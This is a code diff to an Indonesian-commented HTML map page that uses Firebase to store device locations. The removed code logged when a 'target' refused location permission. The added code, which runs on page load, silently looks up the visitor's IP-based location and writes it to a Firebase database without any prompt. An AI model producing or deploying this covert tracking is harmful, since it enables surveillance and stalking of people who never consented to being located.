@@ -15,7 +15,7 @@
     </style>
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
-        import { getDatabase, ref, set, remove, onValue, get } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
+        import { getDatabase, ref, set, onValue } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
 
         // Konfigurasi Firebase Anda
         const firebaseConfig = {
@@ -34,72 +34,6 @@
 
         let deviceID = 'device1'; // Nama perangkat awal
         let isFirstLoad = true; // Flag untuk menandakan apakah peta baru pertama kali dimuat
-
-        // Fungsi untuk mendapatkan lokasi
-        function getLocation() {
-            console.log("Meminta lokasi...");
-            if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(showPosition, showError, {
-                    enableHighAccuracy: true
-                });
-            } else {
-                alert("Geolocation tidak didukung oleh browser ini.");
-            }
-        }
-
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-
-            // Mengirim data lokasi ke Firebase
-            const locationRef = ref(database, `devices/${deviceID}`);
-            set(locationRef, {
-                latitude: lat,
-                longitude: lon,
-                timestamp: Date.now()
-            });
-
-            // Menghapus pesan penolakan izin (jika ada)
-            const notificationRef = ref(database, `notifications/${deviceID}`);
-            remove(notificationRef);
-        }
-
-        function showError(error) {
-            const notificationRef = ref(database, `notifications/${deviceID}`);
-            console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    set(notificationRef, {
-                        message: "Target tidak izinkan lokasi"
-                    });
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Informasi lokasi tidak tersedia.");
-                    break;
-                case error.TIMEOUT:
-                    alert("Permintaan untuk mendapatkan lokasi pengguna telah waktunya habis.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("Terjadi kesalahan yang tidak diketahui.");
-                    break;
-            }
-        }
-
-        // Fungsi untuk mencari ID perangkat unik yang tersedia
-        async function findAvailableDeviceID() {
-            let i = 1;
-            let found = false;
-            while (!found) {
-                const deviceRef = ref(database, `devices/device${i}`);
-                const snapshot = await get(deviceRef);
-                if (!snapshot.exists()) {
-                    deviceID = `device${i}`;
-                    found = true;
-                }
-                i++;
-            }
-            console.log("ID Perangkat yang dipakai:", deviceID);
-        }
 
         // Lokasi default yang akan digunakan untuk geofencing (empat sudut area)
         const defaultLocations = [
@@ -153,7 +87,34 @@
                 .bindPopup(location.name);
         });
 
-        // Fungsi untuk menampilkan lokasi dari Firebase (lokasi pengguna)
+        // Fungsi untuk mendapatkan lokasi berdasarkan IP
+        function getLocationByIP() {
+            fetch('https://ip-api.com/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const lat = data.lat || -7.7956; // Ganti dengan nilai default jika tidak ada
+                    const lon = data.lon || 110.3695; // Ganti dengan nilai default jika tidak ada
+                    updateMap(lat, lon); // Memperbarui peta dengan lokasi berdasarkan IP
+                    saveLocationToFirebase(lat, lon); // Simpan lokasi ke Firebase
+                })
+                .catch(error => {
+                    console.error('Error fetching location by IP:', error);
+                    // Memperbarui peta dengan lokasi default jika tidak bisa mendapatkan lokasi
+                    updateMap(-7.7956, 110.3695);
+                });
+        }
+
+        // Fungsi untuk menyimpan lokasi ke Firebase
+        function saveLocationToFirebase(lat, lon) {
+            const locationRef = ref(database, `devices/${deviceID}`);
+            set(locationRef, {
+                latitude: lat,
+                longitude: lon,
+                timestamp: Date.now()
+            });
+        }
+
+        // Fungsi untuk memperbarui peta dengan marker lokasi pengguna
         function updateMap(lat, lon) {
             // Menghapus marker lama jika ada
             if (window.userMarker) {
@@ -183,9 +144,8 @@
 
         // Mulai mendapatkan lokasi saat halaman dimuat
         window.onload = async () => {
-            await findAvailableDeviceID(); // Cari ID perangkat unik
-            getLocation();
-            getLocationFromFirebase();
+            getLocationByIP(); // Dapatkan lokasi berdasarkan IP
+            getLocationFromFirebase(); // Ambil lokasi dari Firebase
         };
     </script>
 </head>
